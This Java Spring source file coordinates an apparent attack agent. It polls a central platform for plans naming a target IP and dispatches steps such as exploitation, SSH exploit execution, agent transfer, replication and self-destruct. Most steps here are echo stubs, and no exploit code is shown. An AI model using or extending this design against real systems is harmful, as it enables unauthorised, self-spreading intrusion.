package com.spulido.agent.worker;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;
import org.springframework.stereotype.Component;

import com.spulido.agent.config.AgentConfig;
import com.spulido.agent.domain.task.AgentJob;
import com.spulido.agent.domain.task.JobStatus;
import com.spulido.agent.domain.task.StepAction;
import com.spulido.agent.domain.task.TaskDefinition;
import com.spulido.agent.remote.RemoteCommandExecutor;
import com.spulido.agent.remote.SshSessionProvisioner;
import com.spulido.agent.worker.http.AgentHttpClient;
import com.spulido.agent.worker.http.dto.PlanResponse;
import com.spulido.agent.worker.http.dto.PlanStepResponse;
import com.spulido.agent.worker.step.EchoStepHandler;
import com.spulido.agent.worker.step.ExploitationKnowledgeStepHandler;
import com.spulido.agent.worker.step.ExecuteExploitStepHandler;
import com.spulido.agent.worker.step.RequestReplicationStepHandler;
import com.spulido.agent.worker.step.StepHandler;
import com.spulido.agent.worker.step.TransferAgentStepHandler;
import com.spulido.agent.utils.AgentLifecycle;

@Component
public class WorkerCoordinator {

    private static final Logger log = LoggerFactory.getLogger(WorkerCoordinator.class);

    private final ThreadPoolTaskExecutor executor;
    private final TaskExecutionService taskExecutionService;
    private final AgentHttpClient httpClient;
    private final AgentConfig config;
    private final AgentLifecycle agentLifecycle;

    private String targetIp;

    public WorkerCoordinator(ThreadPoolTaskExecutor executor,
                             TaskExecutionService taskExecutionService,
                             AgentHttpClient httpClient,
                             AgentConfig config,
                             AgentLifecycle agentLifecycle) {
        this.executor = executor;
        this.taskExecutionService = taskExecutionService;
        this.httpClient = httpClient;
        this.config = config;
        this.agentLifecycle = agentLifecycle;
    }

    int counter = 0;

    @Scheduled(fixedDelay = 10000)
    public void pollCentralPlatform() {
        log.info("Polling central platform for jobs");
        executor.submit(this::runJob);
        counter++;
    }

    private void runJob() {
        PlanResponse planResponse = httpClient.fetchPlan();
        if (planResponse == null || planResponse.getSteps() == null || planResponse.getSteps().isEmpty()) {
            log.info("No plan received from central");
            return;
        }

        this.targetIp = planResponse.getTargetIp();
        log.info("Received plan with {} steps, target IP: {}", planResponse.getSteps().size(), targetIp);

        List<TaskDefinition> steps = new ArrayList<>();
        List<StepAction> actions = new ArrayList<>();

        for (int i = 0; i < planResponse.getSteps().size(); i++) {
            PlanStepResponse planStep = planResponse.getSteps().get(i);
            StepAction action = parseStepAction(planStep.getAction());
            String command = mapActionToCommand(action, planStep);
            steps.add(new TaskDefinition("step-" + i, i, command, 60));
            actions.add(action);
        }

        String jobId = "job-" + counter;
        log.info("Executing job: {} with actions: {}", jobId, actions);

        AgentJob job = taskExecutionService.executeJob(jobId, steps, actions);

        if (job.getStatus() == JobStatus.FAILED) {
            log.warn("Job {} failed: {}", job.getJobId(), job.getFailureReason());
        } else if (job.getStatus() == JobStatus.COMPLETED) {
            log.info("Job {} completed successfully", job.getJobId());
        }
    }

    private StepAction parseStepAction(String actionStr) {
        if (actionStr == null) {
            return StepAction.ECHO;
        }
        try {
            return StepAction.valueOf(actionStr);
        } catch (IllegalArgumentException e) {
            log.warn("Unknown step action: {}, falling back to ECHO", actionStr);
            return StepAction.ECHO;
        }
    }

    private static String formatCommand(String template, String action) {
        return template.replace("{}", action != null ? action : "unknown");
    }

    private String mapActionToCommand(StepAction action, PlanStepResponse planStep) {
        switch (action) {
            case EXPLOITATION_KNOWLEDGE:
                return "exploitation-knowledge";
            case ECHO:
                return formatCommand("echo Running step: {}", planStep.getAction());
            default:
                return formatCommand("echo Simulating: {}", action.name());
        }
    }

    public static Map<StepAction, StepHandler> createDefaultStepHandlers(AgentHttpClient httpClient,
                                                                           CommandExecutor commandExecutor,
                                                                           AgentConfig agentConfig,
                                                                           ScriptTemplateService scriptTemplateService,
                                                                           RemoteCommandExecutor remoteCommandExecutor,
                                                                           SshSessionProvisioner sshSessionProvisioner) {
        Map<StepAction, StepHandler> handlers = new HashMap<>();
        handlers.put(StepAction.EXPLOITATION_KNOWLEDGE, new ExploitationKnowledgeStepHandler(httpClient));
        handlers.put(StepAction.REQUEST_REPLICATION, new RequestReplicationStepHandler(httpClient));
        handlers.put(StepAction.EXECUTE_EXPLOIT,
                new ExecuteExploitStepHandler(commandExecutor, sshSessionProvisioner));
        handlers.put(StepAction.TRANSFER_AGENT, new TransferAgentStepHandler(httpClient, remoteCommandExecutor,
                new BinaryIntegrityVerifier(agentConfig), scriptTemplateService, agentConfig));
        handlers.put(StepAction.REPLICATE, new EchoStepHandler());
        handlers.put(StepAction.ECHO, new EchoStepHandler());
        handlers.put(StepAction.SYSTEM_SCAN, new EchoStepHandler());
        handlers.put(StepAction.SERVICE_SCAN, new EchoStepHandler());
        handlers.put(StepAction.NETWORK_SCAN, new EchoStepHandler());
        handlers.put(StepAction.GENERATE_REPORT, new EchoStepHandler());
        handlers.put(StepAction.SEND_REPORT, new EchoStepHandler());
        handlers.put(StepAction.SELF_DESTRUCT, new EchoStepHandler());
        return handlers;
    }
}
